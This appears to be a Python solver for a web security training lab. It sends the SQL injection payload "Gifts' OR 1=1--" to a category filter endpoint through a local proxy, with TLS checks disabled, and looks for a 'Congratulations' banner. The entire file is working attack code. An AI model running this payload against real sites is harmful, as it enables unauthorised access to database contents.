import urllib3
import sys
import requests

urllib3 = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sql_injection(s, url):
    file_path = "/filter?category=Gifts'+OR+1=1--"
    s.get(url+file_path, verify=False, proxies=proxies)
    res = s.get(url, verify=False, proxies=proxies)

    if 'Congratulations' in res.text:
        print("(+) SQL Injection succeeded")
    else:
        print("(-) SQL Injection failed")

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url> " %sys.argv[0])
        print("(+) Example: %s www.example.com "  %sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Exploiting SQL Injection Vulnerability...")
    s = requests.session()
    sql_injection(s, url)

if __name__ == '__main__':
    main()